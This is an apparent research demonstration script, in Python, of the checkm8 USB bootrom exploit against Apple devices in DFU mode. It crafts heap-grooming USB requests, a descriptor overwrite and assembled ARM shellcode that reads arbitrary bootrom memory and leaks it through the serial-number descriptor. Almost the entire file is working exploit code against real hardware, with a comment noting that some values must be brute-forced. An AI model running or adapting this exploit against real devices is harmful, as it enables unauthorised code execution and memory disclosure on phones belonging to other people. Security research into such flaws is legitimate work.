#!/usr/bin/python

# https://habr.com/ru/company/dsec/blog/485216/

# random read demonstration script

from checkm8 import *
from keystone import *
from hexdump import *

if __name__ == '__main__':
    device = dfu.acquire_device()
    start = time.time()
    print 'Found:', device.serial_number

    # unknown values, need to brute
    large_leak = 41
    padding = 0x6e0
    conf_desc = '0902190001010580320904000000fe01'\
                '00000721010a00000800000000000000'.decode('hex')
    chunk_meta = '08000000020000000000000000000000'\
                 '00000000000000000000000000000000'.decode('hex')  
    overwrite = conf_desc + chunk_meta + conf_desc + chunk_meta +\
        struct.pack('<20xI', 0x22000000)
    assert len(overwrite) + padding <= 0x800

    payload = '''
        push {r1-r7,lr}

        ldr r4, =0x2201c000
        mov r5, r4

        pattern_matching_loop:
        sub r4, r4, #1

        mov r0, #0
        adr r1, ptrn

        compare_loop:
        add r2, r4, r0, lsl #1
        cmp r2, r5
        bge pattern_matching_loop

        ldrb r3, [r1,r0]
        ldrb r6, [r2]
        cmp r3, r6
        bne pattern_matching_loop
        add r0, r0, #1
        cmp r0, #30
        beq found
        b compare_loop

        found:
        mov r0, #0xff
        strb r0, [r4, #-0x2]

        mov r0, #0
        mov r1, r4
        ldr r2, =0x200 # target address

        rewrite_loop:
        ldrb r3, [r2,r0]
        strb r3, [r1,r0]
        add r0, r0, #1
        cmp r0, #0xfd
        ble rewrite_loop

        pop {r1-r7,pc}

        ptrn:
        .asciz "Apple Mobile Device (DFU Mode)"
    '''

    ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
    payload, _ = ks.asm(payload)
    payload = ''.join(chr(i) for i in payload)

    # heap feng-shui
    usb_req_stall(device)
    for i in range(large_leak):
        usb_req_leak(device)
    usb_req_no_leak(device)
    dfu.usb_reset(device)
    dfu.release_device(device)

    # set global state and restart usb
    device = dfu.acquire_device()
    device.serial_number
    libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
    libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
    dfu.release_device(device)

    time.sleep(0.5)

    # heap occupation
    device = dfu.acquire_device()
    usb_req_stall(device)
    usb_req_leak(device)
    libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, '\0' * padding + overwrite, 100)
    for i in range(0, len(payload), 0x800):
        libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    print '(%0.2f seconds)' % (time.time() - start)
    desc =  device.ctrl_transfer(0x80, 6, 0x303, 0, 0xff, 50)
    leak = ''.join(chr(i) for i in desc)[2:]
    hexdump(leak)
    dfu.release_device(device)
